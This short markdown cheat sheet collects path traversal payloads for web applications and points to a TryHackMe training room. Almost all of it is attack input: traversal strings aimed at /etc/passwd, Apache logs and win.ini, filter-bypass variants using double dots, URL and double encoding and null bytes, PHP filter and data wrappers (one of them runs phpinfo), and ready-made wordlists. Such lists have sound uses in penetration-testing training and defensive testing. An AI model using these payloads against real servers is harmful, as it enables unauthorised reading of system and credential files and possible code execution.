# Path Traversal Cheat Sheet

#### Common Paths to read
```txt
/etc/passwd
/var/log/apache2/access.log
```
___
#### Common Method
```txt
../../../etc/passwd >> For linux

..\..\..\windows\win.ini >> For windows
```
#### Bypassing Defence Mechanism
1. Sequence block bypass >> ....//....//....//....//etc/passwd
2. Sequence block bypass2 >> ..//..//..//..//etc/passwd
3. Encoding ../ >> %2e%2e%2f
4. Absolute path >> /var/www/images/../../../etc/passwd
5. Absolute path2 >> /var/www/html/..//..//..//etc/passwd
6. Using null byte >> ../../../etc/passwd%00.png
7. Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
8. Using Data wrappers >> data:text/plain,<?php%20phpinfo();%20?>
#### Wordlist
```txt
/etc/passwd
../../../../../../../etc/passwd
..//..//..//..//etc/passwd
....//....//....//....//etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/..//..//..//..//etc/passwd
/var/www/images/....//....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd
```
#### File extension with null byte bypass
```
/etc/passwd%00
../../../etc/passwd%00
..//..//..//..//etc/passwd%00
....//....//....//....//etc/passwd%00
/var/www/images/../../../etc/passwd%00
/var/www/images/..//..//..//..//etc/passwd%00
/var/www/images/....//....//....//....//etc/passwd%00
..%252f..%252f..%252fetc/passwd%00
%2Fetc%2Fpasswd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
%2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd%00
```
## To learn
https://tryhackme.com/r/room/filepathtraversal
